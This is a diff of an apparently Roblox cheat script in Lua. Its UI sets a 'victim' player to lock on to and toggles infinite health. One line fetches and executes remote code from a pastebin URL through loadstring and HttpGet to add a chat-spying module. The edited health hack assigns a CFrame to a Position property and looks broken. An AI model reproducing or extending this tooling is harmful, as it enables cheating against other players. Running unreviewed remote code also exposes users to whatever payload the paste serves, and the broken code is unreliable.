@@ -12,7 +12,7 @@ local RS = game:GetService("RunService")
 local currentPlrs = {}
 local VICTIM = nil
 
---]]> CHATSPY <[[--
+-- CHATSPY
 loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
 
 local function getFullUser(input)
@@ -42,7 +42,8 @@ local function InfHealth()
             local PlrName = game.Players.LocalPlayer.Name
             if AutoInfHealth then
                 if game.Workspace:FindFirstChild(PlrName).Humanoid then
-                    game.Workspace:FindFirstChild(PlrName).Head:Remove()
+                    game.Workspace:FindFirstChild(PlrName).Head:BreakJoints()
+                    game.Workspace:FindFirstChild(PlrName).Head.Position = CFrame.new(0,9999999,0)
                 end
             end
         end
@@ -144,10 +145,12 @@ tab.newToggle("Auto Max Health", "", false, function(bool)
     AutoInfHealth = bool
     InfHealth()
 end)
+--[[
 tab.newToggle("Auto Reset", "Auto resets when health is below/equal to 5.", false, function(bool)
     autoRst = bool
     autoReset()
 end)
+]]
 tab.newInput("Username", "Username to lock on.", function(inp)
     getFullUser(inp)
 end)
